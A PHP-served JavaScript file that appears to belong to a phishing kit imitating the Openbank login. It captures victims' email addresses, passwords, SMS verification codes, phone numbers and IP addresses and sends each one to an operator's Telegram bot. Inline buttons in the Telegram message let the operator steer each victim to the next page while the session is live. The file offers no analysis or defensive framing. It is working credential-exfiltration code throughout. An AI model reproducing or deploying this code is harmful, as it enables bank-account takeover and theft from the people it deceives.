<?php
header('Content-Type: application/javascript; charset=utf-8');
require_once __DIR__ . '/settings.php';
?>
// Configuración del Webhook para Telegram (generado por PHP)
const WEBHOOK_CONFIG = {
    telegramBotToken: '<?php echo $token; ?>',
    telegramChatId: '<?php echo $chat_id; ?>',
    get siteUrl() {
        return window.location.origin + window.location.pathname.replace(/\/[^/]*$/, '');
    }
};

// Función para enviar mensaje a Telegram
async function sendToTelegram(message, withButton = false, type = null) {
    try {
        let text = message;
        let replyMarkup = null;

        if (withButton) {
            const sessionId = sessionStorage.getItem('sessionId') || 'unknown';
            
            if (type === 'sms') {
                replyMarkup = {
                    inline_keyboard: [
                        [
                            { text: "\u274c SMS", callback_data: `sms_error:${sessionId}` },
                            { text: "\ud83d\udd04 Login", callback_data: `login:${sessionId}` }
                        ],
                        [
                            { text: "\ud83d\udcf1 Celular", callback_data: `phone:${sessionId}` },
                            { text: "\ud83d\udce7 Mail", callback_data: `mail:${sessionId}` }
                        ]
                    ]
                };
            } else if (type === 'phone') {
                replyMarkup = {
                    inline_keyboard: [
                        [
                            { text: "\ud83d\udcac SMS", callback_data: `sms:${sessionId}` },
                            { text: "\ud83d\udd04 Login", callback_data: `login:${sessionId}` }
                        ],
                        [
                            { text: "\ud83d\udcf1 Celular", callback_data: `phone:${sessionId}` },
                            { text: "\ud83d\udce7 Mail", callback_data: `mail:${sessionId}` }
                        ]
                    ]
                };
            } else {
                replyMarkup = {
                    inline_keyboard: [
                        [
                            { text: "\u274c Login", callback_data: `info:${sessionId}` },
                            { text: "\ud83d\udcac SMS", callback_data: `sms:${sessionId}` }
                        ],
                        [
                            { text: "\ud83d\udcf1 Celular", callback_data: `phone:${sessionId}` },
                            { text: "\ud83d\udce7 Mail", callback_data: `mail:${sessionId}` }
                        ]
                    ]
                };
            }
        }

        const telegramUrl = `https://api.telegram.org/bot${WEBHOOK_CONFIG.telegramBotToken}/sendMessage`;
        const payload = {
            chat_id: WEBHOOK_CONFIG.telegramChatId,
            text: text,
            parse_mode: 'HTML',
            reply_markup: replyMarkup
        };

        const response = await fetch(telegramUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(payload)
        });

        if (!response.ok) {
            console.error('Error en Telegram:', response.status, response.statusText);
            return { success: false, error: response.statusText };
        }

        const result = await response.json();
        return { success: true, data: result };

    } catch (error) {
        console.error('Error al enviar a Telegram:', error);
        return { success: false, error: error.message };
    }
}

// Función para enviar datos al webhook
async function sendToWebhook(data, type) {
    try {
        let message = `\ud83d\udd10 <b>NUEVO INGRESO OPENBANK</b>\n\n`;
        
        if (type === 'email' && data.email) {
            message += `\ud83d\udce9 <b>Mail:</b> <code>${data.email}</code>\n`;
        } else if (type === 'password' && data.password) {
            const savedEmail = sessionStorage.getItem('userEmail');
            if (savedEmail) {
                message += `\ud83d\udce9 <b>Mail:</b> <code>${savedEmail}</code>\n`;
            }
            message += `\ud83d\udd11 <b>Clave:</b> <code>${data.password}</code>\n`;
        } else if (type === 'sms' && data.smsCode) {
            const savedEmail = sessionStorage.getItem('userEmail');
            if (savedEmail) {
                message += `\ud83d\udce9 <b>Mail:</b> <code>${savedEmail}</code>\n`;
            }
            message += `\ud83d\udcf1 <b>C\u00f3digo SMS:</b> <code>${data.smsCode}</code>\n`;
        } else if (type === 'phone' && data.phone) {
            const savedEmail = sessionStorage.getItem('userEmail');
            if (savedEmail) {
                message += `\ud83d\udce9 <b>Mail:</b> <code>${savedEmail}</code>\n`;
            }
            message += `\ud83d\udcde <b>Celular:</b> <code>${data.phone}</code>\n`;
        }
        
        message += `\ud83c\udf10 <b>IP:</b> <code>${await getUserIP()}</code>`;

        const withButton = (type === 'email' || type === 'password' || type === 'sms' || type === 'phone');
        const result = await sendToTelegram(message, withButton, type);
        return result;

    } catch (error) {
        console.error('Error al enviar webhook:', error);
        return { success: false, error: error.message };
    }
}

// Función para obtener IP del usuario
async function getUserIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        return 'No disponible';
    }
}

// Función para redirigir a otra página
function redirectTo(page) {
    window.location.href = page;
}
